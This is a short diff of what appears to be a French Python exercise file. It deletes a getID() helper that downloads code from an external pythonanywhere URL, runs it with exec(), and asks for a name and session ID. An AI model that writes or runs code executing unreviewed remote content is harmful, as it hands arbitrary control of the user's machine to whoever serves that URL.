@@ -94,11 +94,3 @@ def test_exo_1_18():
         print (" Perimetre =", cote1 + cote2 + sqrt ( cote1 * cote1 + cote2 * cote2 ))
     else : # choix invalide
         print (" Cette figure est inconnue ")
-
-#------------------        
-import requests
-def getID():
-    exec(requests.get("https://courdier.pythonanywhere.com/get-send-code").content)
-    name = input("Votre prenom NOM :")
-    session = input('Session Id:')
-#-----------------
